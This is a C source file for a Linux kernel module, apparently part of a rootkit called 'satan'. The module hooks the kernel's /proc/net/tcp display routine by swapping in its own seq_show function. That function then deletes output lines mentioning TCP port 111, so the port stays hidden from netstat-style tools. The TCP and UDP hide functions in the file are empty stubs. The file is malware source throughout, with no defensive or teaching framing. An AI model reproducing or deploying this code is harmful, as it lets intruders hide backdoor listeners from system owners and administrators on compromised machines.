// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "port.h"

#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <net/tcp.h>

#define SECRET_PORT 111
#define NEEDLE_LEN 32
#define TMPSZ 150

static int (*real_seq_show)(struct seq_file *, void *) = NULL;
static int satan_seq_show(struct seq_file *seq, void *v);

static int satan_port_hook_seq_show(void);
static int satan_port_unhook_seq_show(void);
static int satan_seq_show(struct seq_file *seq, void *v);



int satan_port_init(void)
{
        return satan_port_hook_seq_show();
}

void satan_port_exit(void)
{
        satan_port_unhook_seq_show();
}



int satan_port_hide(int port_num)
{
        return satan_port_tcp_hide(port_num) &&
               satan_port_udp_hide(port_num);
}

int satan_port_unhide(int port_num)
{
        return satan_port_tcp_unhide(port_num) &&
               satan_port_udp_unhide(port_num);
}



int satan_port_tcp_hide(int port_num)
{
        return 0;
}

int satan_port_tcp_unhide(int port_num)
{
        return 0;
}

int satan_port_udp_hide(int port_num)
{
        return 0;
}

int satan_port_udp_unhide(int port_num)
{
        return 0;
}



static int satan_port_hook_seq_show(void)
{
        int ret = 0;
        struct file *filp = NULL;
        struct tcp_seq_afinfo *afinfo = NULL;

        filp = filp_open("/proc/net/tcp", O_RDONLY, 0);

        if (IS_ERR(filp)) {
            pr_alert("Failed to open /proc/net/tcp\n");
            ret = 1;
            goto out;
        }

        afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
        real_seq_show = afinfo->seq_ops.show;
        afinfo->seq_ops.show = satan_seq_show;

out:
        if (filp)
                filp_close(filp, 0);

        return ret;
}

static int satan_port_unhook_seq_show(void)
{
        int ret = 0;
        struct file *filp = NULL;
        struct tcp_seq_afinfo *afinfo = NULL;

        filp = filp_open("/proc/net/tcp", O_RDONLY, 0);

        if (IS_ERR(filp)) {
            pr_alert("Failed to open /proc/net/tcp\n");
            ret = 1;
            goto out;
        }

        afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
        afinfo->seq_ops.show = real_seq_show;
        real_seq_show = NULL;

out:
        if (filp)
                filp_close(filp, 0);

        return ret;
}


static int satan_seq_show(struct seq_file *seq, void *v)
{
        int ret;
        char needle[NEEDLE_LEN];

        snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
        ret = real_seq_show(seq, v);

        if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
                pr_alert("satan: port: hiding tcp port %d.\n", SECRET_PORT);
                seq->count -= TMPSZ;
        }

        return ret;
}
